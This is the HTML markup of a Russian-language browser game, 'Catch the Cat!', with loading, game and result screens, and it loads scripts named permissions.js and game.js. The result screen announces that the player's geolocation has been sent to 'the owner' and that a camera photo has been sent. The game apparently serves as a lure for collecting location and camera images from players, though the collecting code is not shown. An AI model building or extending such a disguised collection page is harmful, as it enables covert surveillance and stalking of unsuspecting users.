<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🐕 Поймай Кота! 🐱</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <!-- Экран загрузки -->
    <div id="loadingScreen" class="screen active">
        <div class="loading-container">
            <h1>🐕 Поймай Кота! 🐱</h1>
            <p>Инициализация игры...</p>
            <div class="spinner"></div>
        </div>
    </div>

    <!-- Экран игры -->
    <div id="gameScreen" class="screen">
        <canvas id="gameCanvas"></canvas>
    </div>

    <!-- Экран результата -->
    <div id="resultScreen" class="screen">
        <div class="container result-container">
            <h1>🎉 Ты поймал кота!</h1>
            <p id="resultText"></p>
            <p id="resultGeo">📍 Твоя геолокация отправлена владельцу</p>
            <p id="resultPhoto">📸 Фото с камеры отправлено</p>
            <button id="playAgainBtn" class="btn">Играть снова</button>
        </div>
    </div>

    <script src="permissions.js"></script>
    <script src="game.js"></script>
</body>
</html>
